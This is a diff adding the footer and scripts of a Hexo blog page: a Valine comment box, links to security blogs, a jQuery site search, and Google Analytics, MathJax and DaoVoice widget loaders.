+    <script src="../../js/av-min.js"></script>
+    <script src='../../js/Valine.min.js'></script>
+	<div style="background-color: #FFFFFF">
+    <div id="vcomments"></div>
+    <script>
+        new Valine({
+            el: '#vcomments' ,
+			appId: 'ul15fj2BGxFoWtoSlntkMlMf-gzGzoHsz',
+			appKey: 'vvdd3JD38t8gwf4ytlq3ON3H',
+			notify: false, 
+			verify: false, 
+			avatar: 'wavatar', 
+			placeholder: 'ε = = (づ′▽`)づ '
+        })
+    </script>
+  </div>
+
+</div>
+
+		 
+		 
+        <div class="fixed-action-btn float-sitemap">
+    <a class="btn-floating btn-large pink">
+      <i class="fa fa-caret-square-o-up"></i>
+    </a>
+    <ul>
+      <li><a class="btn-return-top btn-floating waves-effect green" title="Return to top"><i class="fa fa-arrow-circle-o-up"></i></a></li>
+      <li><a class="btn-floating waves-effect button-collapse yellow darken-1"  data-activates="main-menu" title="Menu"><i class="fa fa-navicon"></i></a></li>
+    </ul>
+  </div>
+
+    </main>
+    <footer class="page-footer indigo darken-1">
+    
+    <div class="footer-container container">
+        <div class="row">
+            
+            <div class="social-group col m4 s12">
+                <h5 class="white-text">Social</h5>
+                
+                    <a class="social-link" href="#" target="_blank">
+                        <i class="fa fa-2x fa-weibo"></i>
+                    </a>
+                
+                    <a class="social-link" href="#" target="_blank">
+                        <i class="fa fa-2x fa-github"></i>
+                    </a>
+                
+                    <a class="social-link" href="/atom.xml" target="_blank">
+                        <i class="fa fa-2x fa-rss"></i>
+                    </a>
+                
+                
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+    </script>
+    <div class="site-visitors-container white-text">
+        <span>
+            <i class="fa fa-user"></i>
+            <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+        </span>
+        <span>&nbsp;|&nbsp;</span>
+        <span>
+            <i class="fa fa-eye"></i>
+            <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+        </span>
+    </div>
+
+
+            </div>
+            
+
+            
+            <div class="col m8 s12">
+                <h5 class="white-text">Links</h5>
+                
+                    <a class="social-link" href="https://blog.csdn.net/Wuzebiao2016" target="_blank">wuzebiao</a>
+                
+                    <a class="social-link" href="http://www.ifuryst.com/" target="_blank">iFurySt</a>
+                
+                    <a class="social-link" href="http://daikersec.com/" target="_blank">daiker</a>
+                
+                    <a class="social-link" href="http://blog.dedsec.club" target="_blank">dedsec</a>
+                
+                    <a class="social-link" href="https://www.leavesongs.com/" target="_blank">离别歌</a>
+                
+                    <a class="social-link" href="https://www.sec-wiki.com/" target="_blank">Secwiki</a>
+                
+                    <a class="social-link" href="https://zhuanlan.kanxue.com/" target="_blank">看雪专栏</a>
+                
+                    <a class="social-link" href="http://www.itxueke.com/SecNavi/#3782" target="_blank">IT学客安全导航</a>
+                
+                    <a class="social-link" href="http://www.freebuf.com/" target="_blank">安全客</a>
+                
+                    <a class="social-link" href="https://yq.aliyun.com/articles/?spm=a2c4e.11155573.minheadermenu.3.6cd475c6d2FQvQ" target="_blank">云栖社区</a>
+                
+                    <a class="social-link" href="https://paper.seebug.org/" target="_blank">知道创宇</a>
+                
+                    <a class="social-link" href="https://www.waitalone.cn/pentest" target="_blank">独自等待</a>
+                
+                    <a class="social-link" href="https://3gstudent.github.io/3gstudent.github.io/" target="_blank">三好学生</a>
+                
+                    <a class="social-link" href="http://paper.tuisec.win/index.jsp" target="_blank">先知社区文章</a>
+                
+            </div>
+            
+        </div>
+    </div>
+    
+
+    <div class="footer-copyright pink-link-context">
+        <div class="container">
+            © 2016 example.com, All rights reserved.
+            <p class="right" style="margin-top: 0;">Blog powered by <a href="https://hexo.io">Hexo</a> | Theme <a href="https://github.com/raytaylorlin/hexo-theme-raytaylorism">raytaylorism</a></p>
+        </div>
+    </div>
+</footer>
+
+
+    <noscript>
+    <div class="noscript">
+        <p class="center-align">当前网速较慢或者你使用的浏览器不支持博客特定功能，请尝试刷新或换用Chrome、Firefox等现代浏览器</p>
+    </div>
+</noscript>
+<div class="noscript">
+    <p class="center-align">当前网速较慢或者你使用的浏览器不支持博客特定功能，请尝试刷新或换用Chrome、Firefox等现代浏览器</p>
+</div>
+
+
+<script src="/js/jquery.min.js"></script>
+<script src="/js/materialize.min.js"></script>
+
+<script>
+    (function($) {
+        $(document).ready(function() {
+            // 隐藏禁用javascript（针对微信内置浏览器）的提示
+            $('.noscript').hide();
+
+            // 图片缩放效果
+            var $imgs = $('img').not('.slider-image').not('.avatar-image').not('.carousel-image').not('.card-cover-image').not('.qrcode');
+
+            // 给图片加上点击放大效果（materialbox插件）
+            $imgs.addClass('materialboxed').each(function(i, el) {
+                $(this).attr('data-caption', $(this).attr('alt') || ' ');
+            }).materialbox();
+
+            // 优化表格的显示
+            $('table').each(function() {
+                var $table = $(this);
+                // 除去多行代码的情况
+                if ($table.find('pre').length == 0) {
+                    $table.addClass('responsive-table striped bordered');
+                }
+            });
+
+            // 首页幻灯片
+            $('.slider').slider({indicators: true, full_width: true, interval: 8000});
+
+            $(".button-collapse").sideNav();
+            $(".category-menu").sideNav();
+
+            // 针对gallery post
+            $('.carousel').carousel({full_width: true});
+            $('.carousel-control.prev').click(function() {
+                $('.carousel').carousel('prev');
+            });
+            $('.carousel-control.next').click(function() {
+                $('.carousel').carousel('next');
+            });
+
+            // 文章目录
+            $('article').not('.simple-article').find('h1').add('h2').add('h3').add('h4').add('h5').add('h6').scrollSpy();
+
+            // 目录随屏幕滚动（防止目录过长越过footer）
+            var $toc = $('.toc');
+            var scrollTargetTop = 0;
+            $(window).scroll(function() {
+                var $activeLink = $toc.find('a.active.section');
+                if ($(window).scrollTop() < 100) {
+                    scrollTargetTop = 0;
+                } else {
+                    if ($activeLink[0]) {
+                        scrollTargetTop = $activeLink.offset().top - $toc.offset().top;
+                    }
+                }
+                $toc.css('top', '-' + scrollTargetTop + 'px');
+            });
+
+            // 修正文章目录的left-border颜色
+            var color = $('.table-of-contents-text').css('color');
+            $('.table-of-contents-link').css('border-left-color', color);
+
+            // 针对移动端做的优化：FAB按钮点击一下收回
+            if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
+                $('.fixed-action-btn').addClass('click-to-toggle');
+            }
+            // 回到顶部
+            $('.btn-return-top').click(function() {
+                $('body, html').animate({
+                    scrollTop: 0
+                }, 500);
+            });
+
+            // 重置读书页面的Tab标签页的颜色
+            $('li.tab a').hover(function() {
+                $(this).toggleClass('text-lighten-4');
+            });
+            $('.indicator').addClass('pink lighten-2');
+
+            
+            // 添加new标签
+            $('menu-home, menu-archive, .menu-reading, .menu-about').append('<span class="new badge pink"></span>');
+            
+
+            // 搜索功能
+            $('.modal-trigger').leanModal({
+                // 打开搜索框时自动聚焦
+                ready: function() {
+                    if ($('#search').is(":visible")) {
+                        $('#search-input').focus();
+                    }
+                }
+            });
+            var searchXml = "search.xml";
+            if (searchXml.length == 0) {
+             	searchXml = "search.xml";
+            }
+            var searchPath = "/" + searchXml;
+            initSearch(searchPath, 'search-input', 'search-result');
+        });
+
+        // 初始化搜索与匹配函数
+        var initSearch = function(path, search_id, content_id) {
+            'use strict';
+            $.ajax({
+                url: path,
+                dataType: "xml",
+                success: function(xmlResponse) {
+                    // get the contents from search data
+                    var datas = $("entry", xmlResponse).map(function() {
+                        return {
+                            title: $("title", this).text(),
+                            content: $("content", this).text(),
+                            url: $("url", this).text()
+                        };
+                    }).get();
+                    var $input = document.getElementById(search_id);
+                    var $resultContent = document.getElementById(content_id);
+                    $input.addEventListener('input', function() {
+                        var str = '<ul class=\"search-result-list\">';
+                        var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                        $resultContent.innerHTML = "";
+                        if (this.value.trim().length <= 0) {
+                            return;
+                        }
+                        // perform local searching
+                        datas.forEach(function(data) {
+                            var isMatch = true;
+                            var content_index = [];
+                            var data_title = data.title.trim().toLowerCase();
+                            var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                            var data_url = data.url;
+                            var index_title = -1;
+                            var index_content = -1;
+                            var first_occur = -1;
+                            // only match artiles with not empty titles and contents
+                            if (data_title != '' && data_content != '') {
+                                keywords.forEach(function(keyword, i) {
+                                    index_title = data_title.indexOf(keyword);
+                                    index_content = data_content.indexOf(keyword);
+                                    if (index_title < 0 && index_content < 0) {
+                                        isMatch = false;
+                                    } else {
+                                        if (index_content < 0) {
+                                            index_content = 0;
+                                        }
+                                        if (i == 0) {
+                                            first_occur = index_content;
+                                        }
+                                    }
+                                });
+                            }
+                            // show search results
+                            if (isMatch) {
+                                keywords.forEach(function(keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    data_title = data_title.replace(regS, "<span class=\"search-keyword pink lighten-2\">" + keyword + "</span>");
+                                });
+
+                                str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                                var content = data.content.trim().replace(/<[^>]+>/g, "");
+                                if (first_occur >= 0) {
+                                    // cut out 100 characters
+                                    var start = first_occur - 20;
+                                    var end = first_occur + 80;
+                                    if (start < 0) {
+                                        start = 0;
+                                    }
+                                    if (start == 0) {
+                                        end = 100;
+                                    }
+                                    if (end > content.length) {
+                                        end = content.length;
+                                    }
+                                    var match_content = content.substring(start, end);
+                                    // highlight all keywords
+                                    keywords.forEach(function(keyword) {
+                                        var regS = new RegExp(keyword, "gi");
+                                        match_content = match_content.replace(regS, "<span class=\"search-keyword pink lighten-2\">" + keyword + "</span>");
+                                    });
+
+                                    str += "<p class=\"search-result\">..." + match_content + "...</p>"
+                                }
+                                str += "</li>";
+                            }
+                        });
+                        str += "</ul>";
+                        $resultContent.innerHTML = str;
+                    });
+                }
+            });
+        }
+    })(jQuery);
+</script>
+
+
+<script src="/js/prettify.js"></script>
+<script type="text/javascript">
+    $(document).ready(function() {
+        $("pre").addClass("prettyprint");
+        prettyPrint();
+    });
+</script>
+
+
+<script>
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+            m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+    ga('create', 'UA-124439084-1', 'auto');
+    ga('send', 'pageview');
+
+</script>
+
+
+
+
+
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+  tex2jax: {inlineMath: [['$','$'], ['\\(','\\)']]}
+});
+</script>
+<script type="text/javascript" async
+  src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML">
+</script>
+
+
+
+	
+<script>(function(i,s,o,g,r,a,m){i["DaoVoiceObject"]=r;i[r]=i[r]||function(){(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;a.charset="utf-8";m.parentNode.insertBefore(a,m)})(window,document,"script",('https:' == document.location.protocol ? 'https:' : 'http:') + "//widget.daovoice.io/widget/APP_ID.js","daovoice");</script>
+<script>
+  daovoice('init', {
+    app_id: "45fb937d",
+  });
+  daovoice('update');
+</script>	
+</body>
+</html>
